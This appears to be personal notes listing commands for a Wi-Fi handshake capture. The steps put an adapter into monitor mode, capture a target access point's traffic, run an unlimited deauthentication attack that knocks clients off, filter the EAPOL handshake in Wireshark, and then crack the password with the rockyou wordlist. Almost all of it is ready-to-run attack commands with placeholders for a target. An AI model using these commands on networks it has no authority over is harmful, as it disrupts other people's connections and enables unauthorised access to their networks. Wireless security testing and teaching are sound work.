step-1: enabling monitor mode

ip addr          <-- wifi adapters connected
iwconfig

sudo airmon-ng check kill    <-- kill any obstacles that is between our mission

sudo airmon-ng start wlan0   <-- start monitor mode

sudo airmon-ng           <-- verify that monitor mode is used
iwconfig

sudo airodump-ng wlan0mon   <-- Get the AP's MAC address and channel
ESSID: 
Channel used by AP for SSID: 


!1st Window:
!Make sure to replace the channel number and bssid with your own
!Replace hack1 with your file name like capture1 or something 
sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon

!2nd Window - deauth attack

sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon    <--!Make sure you replace the bssid with your own


wireshark hack1-01.cap       <--!Use Wireshark to open hack file
!Filter Wireshark messages for EAPOL
eapol 


airmon-ng stop wlan0mon       <-- Stop monitor mode

!Crack file with Rock you or another wordlist
!Make sure you have rockyou in text format (unzip with gunzip) 

